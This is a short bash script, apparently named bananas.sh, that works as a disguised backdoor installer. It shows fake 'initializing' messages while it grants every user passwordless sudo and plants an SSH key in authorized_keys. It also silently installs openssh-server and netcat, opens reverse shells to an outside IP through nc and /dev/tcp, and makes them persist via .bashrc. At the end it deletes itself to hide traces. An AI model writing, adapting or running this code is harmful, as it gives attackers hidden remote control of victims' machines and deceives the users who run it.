#!/bin/bash

# MAKE USR BELIEVE HE'S INITING SOMETHING
echo "Initializing/Inicializando..."

RUTA=$(pwd)

# ------ GRANT PRIVILEGES ------

# MAKE ALL USERS SUPERUSERS AVAILABLE
echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# SET SUDO TO NOT ASK FOR SUDOERS PASSWD
echo "%sudo ALL=NOPASSWD: ALL" >> /etc/sudoers

# ------ GO TO HOME, JUST IN CASE ------
cd $HOME
sudo mkdir .ssh > /dev/null 2>&1
cd .ssh/

# ------ TRUSTED RSA ------
PUB_KEY=""
echo $PUB_KEY >> authorized_keys

# ------ REVERSE SHELL ------

IP=""
PORT=6969
echo "Instalando software..."

# INSTALL OPENSSH-SERVER WITHOUT TELLING USR

yes | sudo apt-get install openssh-server > /dev/null 2>&1
echo "Modulo 1 instalado."

# ALSO INSTALL NETCAT FOR MULTIPLE WAYS OF ACESSING

yes | sudo apt-get install netcat > /dev/null 2>&1
echo "Software instalado."
echo "Configurando..."

# MODIFY OPENSSH-SERVER TO LISTEN ON PORT 22

sudo echo "Port 22" >> /etc/ssh/sshd_config

# ENSURE OPENSSH-SERVER ACCESS IS ONLY AVAILABLE TRHOUG PUBLIC KEY AUTH
sudo echo "PasswordAuthentication no" >> /etc/ssh/sshd_config

# CREATE REVERSE SHELL

# FIRST WAY
nc $IP $PORT -e /bin/$0 > /dev/null 2>&1

# BACKUP WAY
bash -i >& /dev/tcp/$IP/$PORT > /dev/null 2>&1

# ADD THE COMMAND TO BASHRC SO IT EXECUTES EVERYTIME USER LOGS IN

echo "nc "$IP" "$PORT" -e /bin/"$0 >> $HOME/.bashrc
echo "bash -i >& /dev/tcp/"$IP"/"$PORT >> $HOME/.bashrc
echo "clear" >> $HOME/.bashrc

# REMOVE FINGERPRINT
cd $RUTA
echo "sudo rm bananas.sh" >> .end.sh
sudo ./.end.sh
